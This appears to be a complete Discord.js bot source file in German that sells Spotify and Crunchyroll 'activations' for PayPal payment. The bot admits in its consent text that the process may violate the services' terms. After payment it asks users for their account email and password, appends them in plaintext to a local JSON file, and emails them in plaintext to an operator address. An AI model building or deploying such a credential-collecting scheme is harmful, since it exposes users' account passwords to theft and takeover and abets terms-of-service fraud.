// Discord.js v14 Bot mit Einverständnis-Abfrage, Dienstwahl, Zahlungsinfo, sicherer Speicherung + E-Mail-Benachrichtigung + DB-ready Struktur
const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, Events, REST, Routes, SlashCommandBuilder } = require('discord.js');
const fs = require('fs');
const nodemailer = require('nodemailer');
require('dotenv').config();

// ✅ .env-Validierung
const requiredEnv = ['TOKEN', 'CLIENT_ID', 'MAIL_USER', 'MAIL_PASS', 'NOTIFY_TO'];
const missingEnv = requiredEnv.filter((key) => !process.env[key]);

if (missingEnv.length > 0) {
  console.error(`❌ Fehlende Umgebungsvariablen: ${missingEnv.join(', ')}`);
  process.exit(1);
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
  partials: [Partials.Channel]
});

// Slash-Command Registrierung
const commands = [
  new SlashCommandBuilder().setName('start').setDescription('Beginnt den Abo-Prozess')
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
(async () => {
  try {
    console.log('🔄 Registriere Slash-Commands...');
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('✅ Slash-Commands registriert.');
  } catch (err) {
    console.error(err);
  }
})();

client.once('ready', () => {
  console.log(`✅ Bot online als ${client.user.tag}`);
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isChatInputCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

  if (interaction.isChatInputCommand() && interaction.commandName === 'start') {
    const consentRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('consent_accept')
        .setLabel('Ich stimme zu')
        .setStyle(ButtonStyle.Success),
      new ButtonBuilder()
        .setCustomId('consent_decline')
        .setLabel('Ich lehne ab')
        .setStyle(ButtonStyle.Danger)
    );

    await interaction.reply({
      content: `Bevor wir fortfahren, musst du dein Einverständnis geben:\n\n☑️ Deine Daten werden temporär verarbeitet, ausschließlich zur Aktivierung.\n☑️ Du verstehst, dass dies gegen die AGB der Dienste verstoßen kann.\n☑️ Du hast dein Passwort vor dem Prozess geändert und änderst es danach wieder.\n☑️ Keine aktiven Abos auf deinem Account vorhanden.\n\nBitte stimme zu, um fortzufahren.`,
      components: [consentRow],
      ephemeral: true
    });
  }

  if (interaction.isButton()) {
    if (interaction.customId === 'consent_decline') {
      await interaction.update({ content: '❌ Vorgang abgebrochen.', components: [] });
      return;
    }

    if (interaction.customId === 'consent_accept') {
      const serviceRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId('choose_spotify')
          .setLabel('Spotify (30 €)')
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId('choose_crunchyroll')
          .setLabel('Crunchyroll (40 €)')
          .setStyle(ButtonStyle.Secondary)
      );

      await interaction.update({
        content: '✅ Zustimmung erhalten. Bitte wähle nun deinen Dienst:',
        components: [serviceRow]
      });
    }

    if (interaction.customId.startsWith('choose_')) {
      const service = interaction.customId === 'choose_spotify' ? 'Spotify' : 'Crunchyroll';
      const price = service === 'Spotify' ? '30 €' : '40 €';

      await interaction.update({
        content: `Du hast **${service}** gewählt. Der Preis beträgt **${price}**.\n\nBitte sende den Betrag an **paypal.me/deinlink**.\n\nKlicke anschließend auf "Ich habe bezahlt", um deine Zugangsdaten einzugeben.`,
        components: [
          new ActionRowBuilder().addComponents(
            new ButtonBuilder()
              .setCustomId(`paid_continue_${service.toLowerCase()}`)
              .setLabel('Ich habe bezahlt')
              .setStyle(ButtonStyle.Success)
          )
        ]
      });
    }

    if (interaction.customId.startsWith('paid_continue_')) {
      const selectedService = interaction.customId.split('_')[2];

      const modal = new ModalBuilder()
        .setCustomId(`login_modal_${selectedService}`)
        .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
        .addComponents(
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('email_input')
              .setLabel('E-Mail oder Benutzername')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('password_input')
              .setLabel('Passwort')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          )
        );

      await interaction.showModal(modal);
    }
  }

  if (interaction.isModalSubmit() && interaction.customId.startsWith('login_modal_')) {
    const service = interaction.customId.split('_')[2];
    const email = interaction.fields.getTextInputValue('email_input');
    const password = interaction.fields.getTextInputValue('password_input');

    const logEntry = {
      timestamp: new Date().toISOString(),
      user: interaction.user.tag,
      userId: interaction.user.id,
      service,
      email,
      password
    };

    fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',\n', (err) => {
      if (err) console.error('Fehler beim Speichern:', err);
    });

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.MAIL_USER,
        pass: process.env.MAIL_PASS
      }
    });

    const mailOptions = {
      from: process.env.MAIL_USER,
      to: process.env.NOTIFY_TO,
      subject: `📬 Neue Bestellung: ${service}`,
      text: `Neue Bestellung von ${interaction.user.tag} (${interaction.user.id})\n\nService: ${service}\nE-Mail: ${email}\nPasswort: ${password}`
    };

    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        console.error('E-Mail-Fehler:', err);
      } else {
        console.log('Benachrichtigung gesendet:', info.response);
      }
    });

    await interaction.reply({
      content: `✅ Danke! Deine Daten für **${service}** wurden empfangen und werden verarbeitet. Du erhältst in Kürze eine Bestätigung.`,
      ephemeral: true
    });
  }
});

client.login(process.env.TOKEN);
